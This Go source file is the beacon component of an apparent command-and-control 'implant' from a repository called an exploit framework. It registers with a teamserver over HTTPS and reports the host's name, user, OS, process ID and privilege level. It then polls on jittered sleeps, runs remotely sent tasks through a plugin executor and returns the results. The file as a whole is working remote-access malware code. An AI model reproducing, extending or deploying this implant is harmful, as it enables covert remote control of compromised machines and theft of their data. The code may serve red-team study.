package implant

import (
	"fmt"
	"log"
	"os"
	"os/user"
	"runtime"
	"time"

	zcrypto "github.com/KKingZero/erebus-exploit-framwork/pkg/crypto"
	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"github.com/KKingZero/erebus-exploit-framwork/pkg/plugin"
	"github.com/KKingZero/erebus-exploit-framwork/implant/tasks"
	"github.com/KKingZero/erebus-exploit-framwork/implant/transport"
	"google.golang.org/protobuf/proto"
)

type Beacon struct {
	config        *Config
	transport     transport.Transport
	executor      *tasks.Executor
	sessionID     string
	sleep         time.Duration
	jitterPct     int
	pendingResults []*pb.TaskResult // buffered results from failed sends
}

func New(cfg *Config) *Beacon {
	return &Beacon{
		config:    cfg,
		transport: transport.NewHTTPSTransport(cfg.Callback),
		executor:  tasks.NewExecutor(plugin.Global),
		sleep:     cfg.Sleep,
		jitterPct: cfg.JitterPct,
	}
}

func (b *Beacon) Run() {
	// Register with teamserver
	if err := b.register(); err != nil {
		log.Printf("[implant] register failed: %v", err)
		// Retry with backoff
		for i := 0; i < 10; i++ {
			wait := zcrypto.JitterDuration(b.sleep*time.Duration(i+1), b.jitterPct)
			time.Sleep(wait)
			if err := b.register(); err == nil {
				break
			}
		}
		if b.sessionID == "" {
			log.Printf("[implant] failed to register after retries, exiting")
			return
		}
	}

	log.Printf("[implant] registered: session=%s", b.sessionID)

	// Beacon loop
	for {
		wait := zcrypto.JitterDuration(b.sleep, b.jitterPct)
		time.Sleep(wait)

		// Send any buffered results from previous failed sends
		results := b.sendResults(b.pendingResults)
		if results != nil {
			b.pendingResults = nil
		}
		if results == nil {
			continue
		}

		if results.Terminate {
			log.Printf("[implant] terminate received, exiting")
			return
		}

		// Update sleep if server changed it
		if results.NextCheckinMs > 0 {
			b.sleep = time.Duration(results.NextCheckinMs) * time.Millisecond
		}

		// Execute tasks and collect results for next beacon
		var taskResults []*pb.TaskResult
		for _, task := range results.Tasks {
			if task.TaskType == pb.TaskType_TASK_EXIT {
				log.Printf("[implant] exit task received")
				return
			}
			if task.TaskType == pb.TaskType_TASK_SLEEP {
				b.handleSleep(task)
				taskResults = append(taskResults, &pb.TaskResult{
					TaskId:  task.TaskId,
					Success: true,
				})
				continue
			}
			result := b.executor.Execute(task)
			taskResults = append(taskResults, result)
		}

		// Buffer results for next send
		b.pendingResults = append(b.pendingResults, taskResults...)

		// Send all buffered results
		if len(b.pendingResults) > 0 {
			if resp := b.sendResults(b.pendingResults); resp != nil {
				b.pendingResults = nil // clear on success
			}
			// On failure, pendingResults are retained for retry
		}
	}
}

func (b *Beacon) register() error {
	hostname, _ := os.Hostname()
	username := "unknown"
	if u, err := user.Current(); err == nil {
		username = u.Username
	}

	now := time.Now().Unix()
	hmac := zcrypto.ComputeHMAC(b.config.Secret, b.config.ImplantID, now)

	reg := &pb.Register{
		ImplantId:      b.config.ImplantID,
		Hostname:       hostname,
		Username:       username,
		Os:             runtime.GOOS,
		Arch:           runtime.GOARCH,
		Pid:            uint32(os.Getpid()),
		IntegrityLevel: getIntegrityLevel(),
		Timestamp:      now,
		Hmac:           hmac,
	}

	resp, err := b.transport.Register(reg)
	if err != nil {
		return err
	}

	if !resp.Success {
		return fmt.Errorf("registration rejected by server")
	}

	b.sessionID = resp.SessionId
	if resp.NextCheckinMs > 0 {
		b.sleep = time.Duration(resp.NextCheckinMs) * time.Millisecond
	}
	return nil
}

func (b *Beacon) sendResults(results []*pb.TaskResult) *pb.BeaconResponse {
	now := time.Now().Unix()
	hmac := zcrypto.ComputeHMAC(b.config.Secret, b.config.ImplantID, now)

	beacon := &pb.Beacon{
		ImplantId: b.config.ImplantID,
		SessionId: b.sessionID,
		Timestamp: now,
		Hmac:      hmac,
		Results:   results,
	}

	resp, err := b.transport.Beacon(beacon)
	if err != nil {
		log.Printf("[implant] beacon error: %v", err)
		return nil
	}
	return resp
}

const maxSleepMs = 86400000 // 24 hours

func (b *Beacon) handleSleep(task *pb.Task) {
	sleepTask := &pb.SleepTask{}
	if err := proto.Unmarshal(task.Data, sleepTask); err != nil {
		return
	}
	if sleepTask.SleepMs > 0 {
		ms := sleepTask.SleepMs
		if ms > maxSleepMs {
			ms = maxSleepMs
		}
		b.sleep = time.Duration(ms) * time.Millisecond
	}
	// Only update jitter if explicitly set (non-zero)
	if sleepTask.JitterPct > 0 && sleepTask.JitterPct <= 100 {
		b.jitterPct = int(sleepTask.JitterPct)
	}
}

